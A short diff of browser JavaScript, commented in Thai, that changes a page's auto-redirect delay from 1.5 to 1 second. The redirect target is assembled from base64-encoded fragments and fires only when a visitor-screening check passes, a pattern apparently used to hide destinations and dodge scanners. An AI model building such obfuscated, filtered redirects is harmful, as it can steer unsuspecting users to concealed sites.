@@ -28,13 +28,13 @@
       return true;
     }
 
-    // เริ่มการเปลี่ยนเส้นทาง (ดีเลย์ 1.5 วิ)
+    // เริ่มการเปลี่ยนเส้นทาง (ดีเลย์ 1 วิ)
     function go() {
       if (shouldRedirect()) {
         setTimeout(() => {
           const finalUrl = atob(part1) + atob(part2) + atob(part3);
           window.location.href = finalUrl;
-        }, 1500); // ดีเลย์ 1500ms = 1.5 วินาที
+        }, 1000); // ดีเลย์ 1000ms = 1 วินาที
       } else {
         document.body.innerHTML = "<h1>ไม่สามารถเปลี่ยนเส้นทางได้</h1><p>ระบบป้องกันบล็อกไว้</p>";
       }
